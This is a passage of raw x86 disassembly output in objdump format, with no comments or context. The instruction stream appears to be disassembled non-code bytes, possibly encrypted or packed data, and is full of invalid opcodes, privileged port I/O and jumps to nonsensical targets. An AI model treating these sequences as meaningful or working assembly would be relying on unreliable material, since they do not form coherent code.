  40b782:	add    BYTE PTR [esi-0x6696d71f],dl
  40b788:	mov    WORD PTR [edx+0x66],ds
  40b78b:	(bad)  
  40b78c:	bound  ebx,QWORD PTR [eax+0x6e]
  40b78f:	sub    eax,DWORD PTR [edi+0x5b]
  40b792:	(bad)  
  40b793:	sbb    BYTE PTR [ebx],0xdf
  40b796:	xchg   ebx,eax
  40b797:	in     eax,dx
  40b798:	fstp   TBYTE PTR [eax+0x4d169d21]
  40b79e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b79f:	xlat   BYTE PTR ds:[ebx]
  40b7a0:	or     bl,BYTE PTR [edi+ecx*2-0x65]
  40b7a4:	lea    esi,[ebp+0x7531f63a]
  40b7aa:	mov    eax,0xa92df1fa
  40b7af:	mov    bh,0xb8
  40b7b1:	cwde   
  40b7b2:	int    0x79
  40b7b4:	pop    ecx
  40b7b5:	scas   eax,DWORD PTR es:[edi]
  40b7b6:	xchg   bh,cl
  40b7b8:	push   0xffffff9f
  40b7ba:	(bad)  
  40b7bc:	and    ecx,DWORD PTR ds:0x3fdf14d3
  40b7c2:	push   0x18
  40b7c4:	loopne 0x40b781
  40b7c6:	outs   dx,BYTE PTR ds:[esi]
  40b7c7:	mov    cl,0xef
  40b7c9:	fnstenv [ebx]
  40b7cb:	jmp    0x40b827
  40b7cd:	rcl    DWORD PTR [ecx-0x31],cl
  40b7d0:	add    DWORD PTR [eax+0x6a],esi
  40b7d3:	stos   DWORD PTR es:[edi],eax
  40b7d4:	stos   BYTE PTR es:[edi],al
  40b7d5:	xchg   ebx,eax
  40b7d6:	jne    0x40b770
  40b7d8:	xchg   edx,eax
  40b7d9:	aas    
  40b7da:	aas    
  40b7db:	push   ss
  40b7dc:	jge    0x40b834
  40b7de:	or     dl,BYTE PTR [edi+0x46]
  40b7e1:	adc    ch,BYTE PTR [eax]
  40b7e3:	lods   al,BYTE PTR ds:[esi]
  40b7e4:	add    al,0x1c
  40b7e6:	or     BYTE PTR [edi],ch
  40b7e8:	cmp    dh,dh
  40b7ea:	repnz and esi,ecx
  40b7ed:	retf   
  40b7ee:	pop    ds
  40b7ef:	je     0x40b773
  40b7f1:	jle    0x40b821
  40b7f3:	fsub   DWORD PTR [edx]
  40b7f5:	jbe    0x40b838
  40b7f7:	ret    0xd93b
  40b7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7fb:	loope  0x40b7ed
  40b7fd:	fcomp  DWORD PTR [esi+0x40]
  40b800:	xchg   ecx,eax
  40b801:	pop    ecx
  40b802:	in     al,dx
  40b803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b804:	inc    esi
  40b805:	outs   dx,BYTE PTR ds:[esi]
  40b806:	aad    0x69
  40b808:	stos   BYTE PTR es:[edi],al
  40b809:	jno    0x40b7be
  40b80b:	pop    edx
  40b80c:	jb     0x40b817
  40b80e:	and    DWORD PTR [esi-0x34],0xe37e74f5
  40b815:	xchg   esi,eax
  40b816:	mov    ds:0x4583b199,eax
  40b81b:	out    dx,eax
  40b81c:	xchg   edi,eax
  40b81d:	xlat   BYTE PTR ds:[ebx]
  40b81e:	or     ebp,edi
  40b820:	lea    ebx,[ebp-0x23]
  40b823:	(bad)  
  40b824:	idiv   ebx
  40b826:	out    dx,eax
  40b827:	ss jne 0x40b847
  40b82a:	xor    ch,al
  40b82c:	jmp    0xdb95656c
  40b831:	popf   
  40b832:	and    ebx,DWORD PTR [ebx-0x66fbf09]
  40b838:	js     0x40b876
  40b83a:	adc    esi,DWORD PTR [edx+0x3c]
  40b83d:	rol    DWORD PTR [ecx-0x3fc0ce4b],0x20
  40b844:	cmp    BYTE PTR [edx+0x40aa9f61],0xbe
  40b84b:	pop    es
  40b84c:	push   edx
  40b84d:	sbb    BYTE PTR [ebx],0x77
  40b850:	adc    DWORD PTR [edi],eax
  40b852:	in     eax,dx
  40b853:	sub    bl,BYTE PTR [eax+0x376ccc9]
  40b859:	mov    esi,0x51845242
  40b85e:	cmp    ah,BYTE PTR [ebp-0x560cb7ea]
  40b864:	in     al,dx
  40b865:	lea    ebp,[eax]
  40b867:	ds jmp 0x40b825
  40b86a:	in     al,0x74
  40b86c:	sar    ecx,0x37
  40b86f:	fst    st(4)
  40b871:	fld    QWORD PTR [edi+eax*4+0x76b4593d]
  40b878:	dec    ebp
  40b879:	iret   
  40b87a:	iret   
  40b87b:	outs   dx,DWORD PTR ds:[esi]
  40b87c:	push   ebp
  40b87d:	mov    ch,0x3f
  40b87f:	cmp    ah,dl
  40b881:	test   eax,0x4addb4d7
  40b886:	sbb    dl,BYTE PTR [esi]
  40b888:	mov    dh,ch
  40b88a:	inc    edx
  40b88b:	dec    edx
  40b88c:	fiadd  WORD PTR [edi]
  40b88e:	cmp    ch,BYTE PTR [ecx]
  40b890:	mov    ch,0xdd
  40b892:	jl     0x40b90d
  40b894:	jbe    0x40b87b
  40b896:	test   al,0x93
  40b898:	or     eax,0x84e8d6ae
  40b89d:	dec    eax
  40b89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b89f:	div    DWORD PTR [ecx-0x3e]
  40b8a2:	rep lods eax,DWORD PTR ds:[esi]
  40b8a4:	jae    0x40b828
  40b8a6:	sub    bh,BYTE PTR [ebx]
  40b8a8:	add    esi,DWORD PTR [eax]
  40b8aa:	dec    esi
  40b8ab:	sub    DWORD PTR [edx],ebx
  40b8ad:	jle    0x40b84b
  40b8af:	fisubr WORD PTR [ebp-0x65044c14]
  40b8b5:	out    dx,al
  40b8b6:	add    esi,DWORD PTR ss:[edx-0x44]
  40b8ba:	add    eax,0xc7435693
  40b8bf:	out    dx,al
  40b8c0:	xor    eax,0x5597d336
  40b8c5:	cdq    
  40b8c6:	mov    dh,0x9
  40b8c8:	sbb    DWORD PTR [ebp+0x4314ab6a],ebp
  40b8ce:	pop    esp
  40b8cf:	fld    QWORD PTR [eax-0x4b]
  40b8d2:	ret    0x37b7
  40b8d5:	ret    0x52d3
  40b8d8:	dec    ebx
  40b8d9:	test   al,0xa8
  40b8db:	jo     0x40b938
  40b8dd:	inc    ecx
  40b8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8df:	or     eax,0x4392f9af
  40b8e4:	lods   al,BYTE PTR ds:[esi]
  40b8e5:	arpl   ax,di
  40b8e7:	xchg   edi,eax
  40b8e8:	pop    ebx
  40b8e9:	ins    BYTE PTR es:[edi],dx
  40b8ea:	(bad)  
  40b8eb:	cmp    BYTE PTR [edi-0x34],dh
  40b8ee:	in     al,0xf4
  40b8f0:	xchg   esp,eax
  40b8f1:	adc    bh,al
  40b8f3:	jge    0x40b889
  40b8f5:	out    dx,eax
  40b8f6:	arpl   WORD PTR [ebx],dx
  40b8f8:	pop    ecx
  40b8f9:	in     eax,dx
  40b8fa:	sub    BYTE PTR [ebx],ch
  40b8fc:	jae    0x40b8ec
  40b8fe:	ins    BYTE PTR es:[edi],dx
  40b8ff:	mov    fs,WORD PTR [edi]
  40b901:	cmp    eax,0xab1e39ba
  40b906:	(bad)  
  40b907:	xor    BYTE PTR [eax-0x68],ah
  40b90a:	inc    ecx
  40b90b:	sub    al,al
  40b90d:	pop    ds
  40b90e:	mov    ecx,DWORD PTR [esi-0xf]
  40b911:	sub    DWORD PTR [ebx],0xfffffffe
  40b914:	adc    al,0xf0
  40b916:	aaa    
  40b917:	dec    edi
  40b918:	cs pop ebx
  40b91a:	out    0xc4,al
  40b91c:	push   ss
  40b91d:	push   ebx
  40b91e:	jo     0x40b980
  40b920:	sbb    esi,ebp
  40b922:	xor    dh,BYTE PTR [ecx]
  40b924:	out    0x87,al
  40b926:	or     dl,cl
  40b928:	push   ebp
  40b929:	pusha  
  40b92a:	jl     0x40b97c
  40b92c:	imul   ecx,edi,0xffffff8c
  40b92f:	lods   al,BYTE PTR ds:[esi]
  40b930:	sbb    ebx,DWORD PTR [ebp+0x21]
  40b933:	mov    ah,0x9e
  40b935:	or     al,0x9
  40b937:	mov    ecx,edx
  40b939:	xchg   eax,edi
  40b93b:	fcmovnu st,st(3)
  40b93d:	stc    
  40b93e:	xor    BYTE PTR [edx+0x7631c3ff],cl
  40b944:	xor    al,0x4c
  40b946:	push   cs
  40b947:	div    DWORD PTR [edx+0x43]
  40b94a:	pop    es
  40b94b:	add    eax,0x54daf801
  40b950:	imul   ebx,DWORD PTR [esi],0xa5d26e25
  40b956:	add    BYTE PTR [eax-0x497c024b],ah
  40b95c:	das    
  40b95d:	in     al,0x60
  40b95f:	and    ebx,esp
  40b961:	mov    esi,0xc982b0d3
  40b966:	mov    ecx,0x6c180d19
  40b96b:	aas    
  40b96c:	mov    edx,0xea966b52
  40b971:	dec    edi
  40b972:	int3   
  40b973:	in     al,0x0
  40b975:	and    DWORD PTR [esi],esp
  40b977:	inc    ebp
  40b978:	pop    ss
  40b979:	enter  0xcacb,0x74
  40b97d:	inc    ebx
  40b97e:	jp     0x40b9cb
  40b980:	mov    ?,edi
  40b982:	fwait
  40b983:	daa    
  40b984:	push   cs
  40b985:	pop    ebx
  40b986:	xor    ah,BYTE PTR [ebx]
  40b988:	jnp    0x40b96e
  40b98a:	outs   dx,DWORD PTR ds:[esi]
  40b98b:	mov    DWORD PTR [edi-0x55cc4ba9],esp
  40b991:	lods   al,BYTE PTR ds:[esi]
  40b992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b993:	(bad)  
  40b994:	and    ebp,DWORD PTR [esi]
  40b996:	mov    eax,ds:0x92147218
  40b99b:	dec    ecx
  40b99c:	nop
  40b99d:	adc    al,0x7e
  40b99f:	sbb    DWORD PTR [edx+0x1],esp
  40b9a2:	lods   al,BYTE PTR ds:[esi]
  40b9a3:	cmp    ah,BYTE PTR [ebx-0x1e]
  40b9a6:	add    al,BYTE PTR [ecx]
  40b9a8:	aam    0x4e
  40b9aa:	orps   xmm0,XMMWORD PTR [ebp+0x386aab9c]
  40b9b1:	xchg   BYTE PTR [edx],bl
  40b9b3:	shufps xmm4,xmm5,0xc4
  40b9b7:	xchg   ebx,eax
  40b9b8:	das    
  40b9b9:	jle    0x40b99e
  40b9bb:	icebp  
  40b9bc:	(bad)  
  40b9bd:	sub    BYTE PTR [eax+eiz*8-0x415070fd],bl
  40b9c4:	mov    ss,WORD PTR [esp+ebp*4+0xf]
  40b9c8:	inc    eax
  40b9c9:	test   BYTE PTR [edx],ah
  40b9cb:	popf   
  40b9cc:	add    DWORD PTR [eax-0x6c],edx
  40b9cf:	inc    ecx
  40b9d0:	xlat   BYTE PTR ds:[ebx]
  40b9d1:	or     ah,BYTE PTR [edi+0xb]
  40b9d4:	repz test ch,al
  40b9d7:	and    esp,DWORD PTR [edx-0x5]
  40b9da:	out    dx,eax
  40b9db:	push   ebx
  40b9dc:	or     eax,0x8a055d18
  40b9e1:	cli    
  40b9e2:	sub    al,0x53
  40b9e4:	bound  esi,QWORD PTR [ecx-0x37]
  40b9e7:	lock shr ch,cl
  40b9ea:	add    DWORD PTR [edx-0x40],0x3fd185a2
  40b9f1:	enter  0x512c,0xb5
  40b9f5:	imul   ebx,DWORD PTR [edi],0xfffffff1
  40b9f8:	in     eax,0x6e
  40b9fa:	in     eax,dx
  40b9fb:	(bad)  
  40b9fc:	cli    
  40b9fd:	pop    ss
  40b9fe:	fnstcw WORD PTR [ecx-0x31a0115c]
  40ba04:	pop    ebp
  40ba05:	push   ebp
  40ba06:	adc    DWORD PTR [ebx+0x3a195ac2],edx
  40ba0c:	das    
  40ba0d:	in     al,0x21
  40ba0f:	jecxz  0x40ba73
  40ba11:	cmp    ebp,DWORD PTR [edi+esi*1]
  40ba14:	iret   
  40ba15:	xor    al,0xbf
  40ba17:	mov    ds:0x5ba01c2e,al
  40ba1c:	popa   
  40ba1d:	lods   eax,DWORD PTR ds:[esi]
  40ba1e:	sub    esp,DWORD PTR ds:0x2dfbe80f
  40ba24:	fisubr DWORD PTR [edx]
  40ba26:	(bad)  
  40ba27:	xchg   ebp,eax
  40ba28:	adc    esi,esp
  40ba2a:	shl    DWORD PTR [eax-0x64b4af8a],0x87
  40ba31:	fst    QWORD PTR [esi+edx*1-0x26da4924]
  40ba38:	sbb    BYTE PTR gs:[ecx-0x131c8a0c],0x62
  40ba40:	xchg   ecx,eax
  40ba41:	ins    DWORD PTR es:[edi],dx
  40ba42:	popa   
  40ba43:	jmp    0x40ba92
  40ba45:	or     DWORD PTR [eax-0x69fa6f03],0x74
  40ba4c:	pop    ss
  40ba4d:	mov    ds:0x1caac119,eax
  40ba52:	(bad)  [edx]
  40ba54:	call   0x50966b1e
  40ba59:	mov    bh,0xa7
  40ba5b:	es call 0xd2a8e8ab
  40ba61:	adc    al,0xd4
  40ba63:	test   eax,0x6b6d68fe
  40ba68:	scas   al,BYTE PTR es:[edi]
  40ba69:	add    al,0x87
  40ba6b:	push   ebx
  40ba6c:	cmp    BYTE PTR [edi-0x61],cl
  40ba6f:	sahf   
  40ba70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba71:	fld    QWORD PTR [ecx]
  40ba73:	jbe    0x40ba03
  40ba75:	(bad)  
  40ba76:	addr16 out dx,eax
  40ba78:	stos   DWORD PTR es:[edi],eax
  40ba79:	pop    ebx
  40ba7a:	(bad)  
  40ba7b:	adc    DWORD PTR [ecx+0x35],ebx
  40ba7e:	cvtpi2ps xmm2,QWORD PTR [eax]
  40ba81:	xchg   esp,eax
  40ba82:	dec    ebp
  40ba83:	repnz mov bh,0x83
  40ba86:	add    al,0x42
  40ba88:	dec    ecx
  40ba89:	jp     0x40ba32
  40ba8b:	cmp    eax,0xc0bc412c
  40ba90:	add    al,BYTE PTR [eax-0x1e61b981]
  40ba96:	mov    dl,0x84
  40ba98:	test   al,0xd5
  40ba9a:	jg     0x40ba42
  40ba9c:	lods   eax,DWORD PTR ds:[esi]
  40ba9d:	pushf  
  40ba9e:	ss xchg ebp,eax
  40baa0:	push   edx
  40baa1:	add    BYTE PTR [edx+0x32],dl
  40baa4:	(bad)  
  40baa5:	lahf   
  40baa6:	iret   
  40baa7:	pusha  
  40baa8:	outs   dx,DWORD PTR ds:[esi]
  40baa9:	ja     0x40babc
  40baab:	add    DWORD PTR [esi-0x7],edx
  40baae:	adc    al,BYTE PTR [edi+ecx*4-0x6]
  40bab2:	enter  0x9d2a,0xe
  40bab6:	out    0xb1,eax
  40bab8:	sbb    BYTE PTR [edi+0x34d791f1],dl
  40babe:	push   ss
  40babf:	and    BYTE PTR [esi+0x7d],cl
  40bac2:	xchg   ecx,eax
  40bac3:	pop    edx
  40bac4:	pushf  
  40bac5:	je     0x40bae3
  40bac7:	pop    es
  40bac8:	das    
  40bac9:	les    edx,FWORD PTR [esi]
  40bacb:	pusha  
  40bacc:	popf   
  40bacd:	push   eax
  40bace:	call   0x44f5:0x5ad1d54f
  40bad5:	sbb    ebp,DWORD PTR [ecx+0x67b81f90]
  40badb:	popa   
  40badc:	xchg   DWORD PTR [eax],edi
  40bade:	stc    
  40badf:	pop    ebp
  40bae0:	mov    esi,0xdbd85653
  40bae5:	pop    ebx
  40bae6:	jl     0x40bb23
  40bae8:	(bad)  [edx-0x227d4953]
  40baee:	jns    0x40bb66
  40baf0:	xchg   edi,eax
  40baf1:	repz add cl,BYTE PTR [ebp+0x2b]
  40baf5:	xchg   edx,eax
  40baf6:	mov    ds:0x2d24f532,al
  40bafb:	adc    eax,DWORD PTR [edi]
  40bafd:	outs   dx,DWORD PTR ds:[esi]
  40bafe:	js     0x40bb32
  40bb00:	js     0x40ba8c
  40bb02:	pop    ds
  40bb03:	add    ebx,DWORD PTR [eax+ecx*2]
  40bb06:	push   cs
  40bb07:	adc    DWORD PTR [edi],ebx
  40bb09:	inc    ecx
  40bb0a:	sub    al,0x4d
  40bb0c:	mov    ch,0x16
  40bb0e:	add    cl,BYTE PTR [ecx+0x1fbc3d52]
  40bb14:	int3   
  40bb15:	out    0xd2,al
  40bb17:	xchg   edx,eax
  40bb18:	xchg   ecx,eax
  40bb19:	gs stos BYTE PTR es:[edi],al
  40bb1b:	sar    DWORD PTR [eax-0x80],0xd7
  40bb1f:	adc    DWORD PTR [ebx+edi*1],0x5d2b5342
  40bb26:	xchg   esi,eax
  40bb27:	push   ds
  40bb28:	mov    bh,ch
  40bb2a:	cmc    
  40bb2b:	push   ss
  40bb2c:	sub    ah,BYTE PTR [ebx+0x4a1b1827]
  40bb32:	or     al,0xa1
  40bb34:	add    cl,al
  40bb36:	push   edx
  40bb37:	loopne 0x40bb4a
  40bb39:	mov    eax,ds:0x6d7942c4
  40bb3e:	(bad)  
  40bb40:	test   DWORD PTR [eax-0x7],eax
  40bb43:	push   0x79
  40bb45:	(bad)  [ebx]
  40bb47:	pop    ds
  40bb48:	fcmovnb st,st(0)
  40bb4a:	int    0xd
  40bb4c:	in     al,0x3c
  40bb4e:	aaa    
  40bb4f:	je     0x40bb0e
  40bb51:	adc    eax,0x793d6de4
  40bb56:	push   0xfffffffd
  40bb58:	adc    al,0x4d
  40bb5a:	leave  
  40bb5b:	lods   al,BYTE PTR ds:[esi]
  40bb5c:	xor    al,BYTE PTR [eax-0x72]
  40bb5f:	neg    DWORD PTR ds:[edx-0x13]
  40bb63:	jecxz  0x40bb51
  40bb65:	or     DWORD PTR [edi-0x6f],edi
  40bb68:	aam    0xeb
  40bb6a:	jnp    0x40bb22
  40bb6c:	ja     0x40bb9b
  40bb6e:	aam    0x2
  40bb70:	push   es
  40bb71:	hlt    
  40bb72:	mov    DWORD PTR [edi],ecx
  40bb74:	xlat   BYTE PTR ds:[ebx]
  40bb75:	xor    al,0xd4
  40bb77:	sbb    DWORD PTR [eax],0xffffff95
  40bb7a:	hlt    
  40bb7b:	sbb    al,0x8c
  40bb7d:	or     BYTE PTR [ebp+0x4d],cl
  40bb80:	jmp    0x40bb82
  40bb82:	in     eax,0x32
  40bb84:	inc    ecx
  40bb85:	lahf   
  40bb86:	inc    eax
  40bb87:	mov    esi,0x500bdeff
  40bb8c:	and    eax,0xb16c3f18
  40bb91:	imul   edi,DWORD PTR [esi-0x7a],0x30
  40bb95:	imul   ecx,DWORD PTR [ebx-0x67],0x8b272f71
  40bb9c:	lock add eax,0xf0631b4b
  40bba2:	jge    0x40bbd8
  40bba4:	push   edi
  40bba5:	inc    edx
  40bba6:	push   esp
  40bba7:	les    edx,FWORD PTR [ecx-0x171f7ef6]
  40bbad:	adc    cl,cl
  40bbaf:	xchg   edi,eax
  40bbb0:	fwait
  40bbb1:	mov    ecx,0x7c3a58f3
  40bbb6:	push   esp
  40bbb7:	rcr    DWORD PTR [ecx-0x1f],0xe9
  40bbbb:	push   0xff2ac61b
  40bbc0:	and    al,0x53
  40bbc2:	sti    
  40bbc3:	and    edi,edi
  40bbc5:	mov    DWORD PTR [edx-0x4e0d3927],esp
  40bbcb:	sahf   
  40bbcc:	shl    edi,cl
  40bbce:	jbe    0x40bc37
  40bbd0:	imul   edi,DWORD PTR [ebx+eiz*4-0x7c],0xffffffbb
  40bbd5:	or     eax,0x1af7bd71
  40bbda:	stos   BYTE PTR es:[edi],al
  40bbdb:	xor    edi,DWORD PTR [ebp-0x6e64173f]
  40bbe1:	adc    dl,dl
  40bbe3:	aaa    
  40bbe4:	mov    al,fs:0xa43478d1
  40bbea:	jnp    0x40bc56
  40bbec:	aas    
  40bbed:	fwait
  40bbee:	loop   0x40bba8
  40bbf0:	cmp    DWORD PTR [ecx-0x3218c349],ebp
  40bbf6:	push   edx
  40bbf7:	aas    
  40bbf8:	arpl   si,dx
  40bbfa:	sbb    DWORD PTR [edx],edx
  40bbfc:	test   DWORD PTR [ecx+0x68845d87],ebp
  40bc02:	adc    eax,DWORD PTR [ebx+ebp*1]
  40bc05:	dec    edx
  40bc06:	and    edi,DWORD PTR [ebx-0x4e]
  40bc09:	jno    0x40bbee
  40bc0b:	cmp    esp,ecx
  40bc0d:	xchg   edi,eax
  40bc0e:	mov    ecx,0xffc28c70
  40bc13:	xchg   esi,eax
  40bc14:	mov    BYTE PTR [edi-0x3dd32502],bh
  40bc1a:	mov    esi,?
  40bc1c:	and    al,0x4a
  40bc1e:	cli    
  40bc1f:	nop
  40bc20:	lock stos BYTE PTR es:[edi],al
  40bc22:	pop    edi
  40bc23:	test   BYTE PTR [edx+ecx*8-0x7680236d],al
  40bc2a:	mov    al,0xab
  40bc2c:	mov    ds:0xa4faf914,al
  40bc31:	mov    DWORD PTR [eax+0x131bb920],edi
  40bc37:	mov    bl,0x16
  40bc39:	imul   ebx,DWORD PTR [esi+0x38],0x87ee2ebb
  40bc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc41:	std    
  40bc42:	outs   dx,BYTE PTR es:[esi]
  40bc44:	dec    eax
  40bc45:	jge    0x40bc1b
  40bc47:	mov    al,0x14
  40bc49:	sahf   
  40bc4a:	popf   
  40bc4b:	div    DWORD PTR [esi-0x48bf1a77]
  40bc51:	cmp    dh,BYTE PTR [eax]
  40bc53:	mov    dh,0x2
  40bc55:	arpl   WORD PTR [edi],di
  40bc57:	dec    eax
  40bc58:	or     BYTE PTR [esi],bh
  40bc5a:	push   0x62af3b3c
  40bc5f:	sub    DWORD PTR [edi+0xe],esi
  40bc62:	sbb    DWORD PTR [edx],ecx
  40bc64:	in     eax,0x4e
  40bc66:	adc    BYTE PTR [ecx],dh
  40bc68:	mov    edi,0x9e1a4bd2
  40bc6d:	and    al,0x4e
  40bc6f:	adc    DWORD PTR [ebx],ebp
  40bc71:	xchg   esp,eax
  40bc72:	jp     0x40bc70
  40bc74:	test   BYTE PTR [edx+0x77],bh
  40bc77:	sub    edx,ecx
  40bc79:	cmp    BYTE PTR [edi-0xb44a3c1],ah
  40bc7f:	or     DWORD PTR es:[esi-0x7031f273],ebp
  40bc86:	out    0x8b,al
  40bc88:	adc    eax,0x64924c67
  40bc8d:	pop    eax
  40bc8e:	adc    ah,BYTE PTR [edx-0x4e10f422]
  40bc94:	adc    ebx,edx
  40bc96:	xor    BYTE PTR [esi+eiz*1-0x62],0x62
  40bc9b:	dec    esi
  40bc9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9d:	mov    ebx,0xf1526016
  40bca2:	mov    ebx,0x1e3c7437
  40bca7:	mov    edx,0x27c5c0dc
  40bcac:	push   ss
  40bcad:	icebp  
  40bcae:	enter  0x2980,0x4c
  40bcb2:	das    
  40bcb3:	call   0x1c9e:0x864b9ac1
  40bcba:	psubd  mm3,QWORD PTR [ebp*1-0x31faeeaa]
  40bcc2:	fistp  QWORD PTR [esi+0x69]
  40bcc5:	inc    eax
  40bcc6:	dec    eax
  40bcc7:	sub    cl,dh
  40bcc9:	xlat   BYTE PTR ds:[ebx]
  40bcca:	daa    
  40bccb:	(bad)  
  40bccc:	xchg   esi,eax
  40bccd:	aas    
  40bcce:	push   esp
  40bccf:	and    cl,cl
  40bcd1:	das    
  40bcd2:	inc    edx
  40bcd3:	repz shl cl,0xf
  40bcd7:	sahf   
  40bcd8:	or     cl,dh
  40bcda:	rcl    ch,cl
  40bcdc:	jg     0x40bc62
  40bcde:	mov    cl,0xb4
  40bce0:	shr    BYTE PTR ds:0xd46e3ffb,cl
  40bce6:	mov    esi,0x8a8abadd
  40bceb:	addr16 iret 
  40bced:	adc    cl,BYTE PTR [ebx+0x3a]
  40bcf0:	popa   
  40bcf1:	sar    esi,1
  40bcf3:	lock mov ebx,ebp
  40bcf6:	inc    edi
  40bcf7:	and    BYTE PTR [ebp-0x40],bl
  40bcfa:	sub    DWORD PTR [ecx-0x3b],ebx
  40bcfd:	int3   
  40bcfe:	mov    edi,0x33d8ef7f
  40bd03:	cwde   
  40bd04:	outs   dx,DWORD PTR ds:[esi]
  40bd05:	(bad)  
  40bd06:	and    eax,DWORD PTR [esi+0x34]
  40bd09:	push   eax
  40bd0a:	js     0x40bca5
  40bd0c:	pop    ecx
  40bd0d:	add    dh,BYTE PTR gs:[ebx]
  40bd10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd11:	cmc    
  40bd12:	mov    esi,?
  40bd14:	push   cs
  40bd15:	stc    
  40bd16:	jnp    0x40bd7c
  40bd18:	add    edx,DWORD PTR [esp+esi*2-0x5b0b5186]
  40bd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd20:	xor    esi,edx
  40bd22:	(bad)  
  40bd23:	jne    0x40bd64
  40bd25:	jmp    0x40bcda
  40bd27:	rcr    BYTE PTR [ebx-0x28],cl
  40bd2a:	mov    eax,0x55aec97
  40bd2f:	loopne 0x40bd7e
  40bd31:	stos   BYTE PTR es:[edi],al
  40bd32:	scas   eax,DWORD PTR es:[edi]
  40bd33:	fimul  DWORD PTR [ebx]
  40bd35:	aas    
  40bd36:	retf   
  40bd37:	dec    edx
  40bd38:	add    BYTE PTR [esi],dl
  40bd3a:	inc    esp
  40bd3b:	out    0xa6,al
  40bd3d:	dec    edx
  40bd3e:	adc    esi,DWORD PTR [edi+0x596b71a1]
  40bd44:	pop    esi
  40bd45:	or     DWORD PTR [ebx],0xac92ad98
  40bd4b:	xor    al,0x98
  40bd4d:	xlat   BYTE PTR ds:[ebx]
  40bd4e:	addr16 mov edx,0x82b8c61a
  40bd54:	jmp    0x45b82163
  40bd59:	and    BYTE PTR [esi+0x40],bh
  40bd5c:	sub    eax,0x4d01f11c
  40bd61:	jl     0x40bdd2
  40bd63:	into   
  40bd64:	retf   
  40bd65:	dec    ebx
  40bd66:	hlt    
  40bd67:	out    dx,al
  40bd68:	les    esi,FWORD PTR [esi-0x52371a3c]
  40bd6e:	jecxz  0x40bd53
  40bd70:	and    BYTE PTR [esp+ebx*1-0x17],0xb8
  40bd75:	mov    edx,esp
  40bd77:	or     bh,BYTE PTR [ebx*2+0xe44ffa5]
  40bd7e:	xchg   ecx,eax
  40bd7f:	adc    BYTE PTR ds:0x43c4c244,dl
  40bd85:	adc    BYTE PTR [ebx+0x7c],ch
  40bd88:	push   fs
  40bd8a:	dec    edi
  40bd8b:	out    dx,al
  40bd8c:	cmp    bh,BYTE PTR [ebp+eiz*8+0x79bd0449]
  40bd93:	fdivp  st(4),st
  40bd95:	inc    esp
  40bd96:	bound  ebp,QWORD PTR [ecx]
  40bd98:	icebp  
  40bd99:	test   eax,0x32f79b30
  40bd9e:	push   esp
  40bd9f:	lods   al,BYTE PTR ds:[esi]
  40bda0:	push   es
  40bda1:	shl    dl,1
  40bda3:	ret    
  40bda4:	fcmovnu st,st(0)
  40bda6:	outs   dx,DWORD PTR ds:[esi]
  40bda7:	dec    edx
  40bda8:	cmp    ecx,DWORD PTR [eax-0x74c6d6f]
  40bdae:	mov    ch,0xc2
  40bdb0:	sub    ah,BYTE PTR [ebp-0x449aa803]
  40bdb6:	shr    DWORD PTR [ebx-0x6],cl
  40bdb9:	out    dx,al
  40bdba:	dec    DWORD PTR [esi-0x43]
  40bdbd:	adc    dl,bh
  40bdbf:	jb     0x40be09
  40bdc1:	push   ds
  40bdc2:	push   ecx
  40bdc3:	jecxz  0x40be41
  40bdc5:	jl     0x40be1b
  40bdc7:	mov    ch,0x25
  40bdc9:	(bad)  
  40bdca:	push   ebx
  40bdcb:	mov    ch,0x92
  40bdcd:	push   es
  40bdce:	arpl   dx,cx
  40bdd0:	xchg   ebp,eax
  40bdd1:	pop    esp
  40bdd2:	aad    0x18
  40bdd4:	stos   DWORD PTR es:[edi],eax
  40bdd5:	cmp    al,0xc2
  40bdd7:	aaa    
  40bdd8:	out    dx,al
  40bdd9:	mov    ecx,0x799c9f9a
  40bdde:	arpl   WORD PTR cs:[edi],bp
  40bde1:	pop    edi
  40bde2:	mov    al,ds:0x7ed060d3
  40bde7:	add    dh,ch
  40bde9:	in     al,dx
  40bdea:	lods   al,BYTE PTR ds:[esi]
  40bdeb:	push   eax
  40bdec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bded:	dec    ebx
  40bdee:	mov    ds:0x2c1fdfe,al
  40bdf3:	adc    ch,BYTE PTR [esi+0x30a3af58]
  40bdf9:	mov    ds:0x3a0af25d,eax
  40bdfe:	jge    0x40be0a
  40be00:	out    dx,al
  40be01:	cdq    
  40be02:	mov    esi,0x9df8ee39
  40be07:	aad    0xd4
  40be09:	ret    
  40be0a:	jp     0x40bda1
  40be0c:	leave  
  40be0d:	and    al,0x93
  40be0f:	xchg   edi,eax
  40be10:	xchg   ebx,eax
  40be11:	mov    eax,0xd5fe27bb
  40be16:	sbb    al,0xb3
  40be18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be19:	fimul  DWORD PTR [esi]
  40be1b:	xchg   ebx,eax
  40be1c:	mov    edx,0x6f7afdc0
  40be21:	dec    ecx
  40be22:	scas   al,BYTE PTR es:[edi]
  40be23:	lds    edi,FWORD PTR [edi+0x1e657547]
  40be29:	push   0x96ff0ee6
  40be2e:	pop    ecx
  40be2f:	inc    ecx
  40be30:	inc    edi
  40be31:	ror    BYTE PTR [eax],1
  40be33:	jmp    0x40be29
  40be35:	add    eax,0x9be13d45
  40be3a:	cdq    
  40be3b:	xor    edx,DWORD PTR [ebp+0x1433c8ed]
  40be41:	outs   dx,DWORD PTR ds:[esi]
  40be42:	retf   
  40be43:	xchg   DWORD PTR [edi-0x2a8ccd09],esi
  40be49:	adc    al,0xc2
  40be4b:	ds dec edx
  40be4d:	icebp  
  40be4e:	pop    ebp
  40be4f:	std    
  40be50:	ret    
  40be51:	xor    ebx,0xe5be085b
  40be57:	icebp  
  40be58:	imul   esi,DWORD PTR [ecx-0xf385048],0x10d14f4b
  40be62:	dec    ecx
  40be63:	das    
  40be64:	fbstp  TBYTE PTR [ebx-0x65ab450a]
